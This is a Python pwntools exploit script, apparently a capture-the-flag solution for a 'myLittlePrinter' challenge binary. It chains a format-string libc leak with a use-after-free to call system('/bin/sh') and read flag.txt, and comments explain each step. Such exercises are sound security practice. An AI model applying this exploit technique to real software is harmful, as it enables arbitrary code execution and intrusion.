#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import re

exe = context.binary = ELF("./myLittlePrinter", checksec=False)
context.log_level = "error"


def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
# Idea: When a printer is created, it stores the address of the print function
# the current printer is a pointer to the printer, meaning the address of a print function
# if one is able to overwrite the address of the print function to system, that will be executed
#this is done here

# Spartak: FIXED Seans Task:
# - libc calc was wrong ==> system addr was wrong
# - packing etc. easier 
# - recvuntil more errorprone 

# Theorie:
# - erstelle printer mit der print_plain Methode ==> die hat nen Format String Exploit (raw) ; 1
# - setze den printer auf den "Main printer" (Pointer!) ; 3
# - Format String Exploit ==> leak libc Base (Auf dem Stack ne libc addresse mit %p) offset via gdb; 6
# - delete printer, ABER: der Pointer zeigt noch auf den printer der jetzt befreit ist! ==> UAF!; 2
# - mache einen User mit system als name, wird auf dem GLEICHEN Block allokiert wie der Printer! ==> Kann die Adresse die im Printer steht nutzen; 4
# - print your message "/bin/sh", pointer zeigt noch auf den alten printer der jetzt der user ist aka system und als Parameter wird "/bin/sh" Ã¼bergeben
# ==> PROFIT eZ


def main():    
    io = start()
    libc = exe.libc

    io.recvuntil(b">>")
    io.sendline(b'1')   #create Printer with plain print function
    io.recvuntil(b":")
    io.sendline(b'2') # set plain function
    io.recvuntil(b">>")

    io.sendline(b'3') # set printer as current printer
    io.recvuntil(b":")
    io.sendline(b'0')
    io.recvuntil(b">>")
    io.sendline(b"6")
    io.recvuntil(b":")
    io.sendline(b'%147$p') # leak address of __libc_start_main+243
    addr = io.recvuntil(b">>")[4:18]

    libc.address = int(addr, 16) - libc.sym["__libc_start_call_main"] - 128

    system = p64(libc.sym.system)

    io.sendline(b'2') # delete printer for use after free
    io.recvuntil(b":")
    io.sendline(b'0')
    io.recvuntil(b">>")

    io.sendline(b'4') # create user
    io.recvuntil(b":")
    io.sendline(system) # user name is address of system
    io.recvuntil(b">>")

    io.sendline(b'6')   # print message
    io.recvuntil(b":")
    io.sendline(b'/bin/sh') # message is /bin/sh

    io.recv(timeout=0.5)

    io.sendline(b'cat flag.txt') # print flag
    flag = io.recvuntil(b"}")
    print(flag.decode('utf-8')[:])

if __name__ == "__main__":
    main()
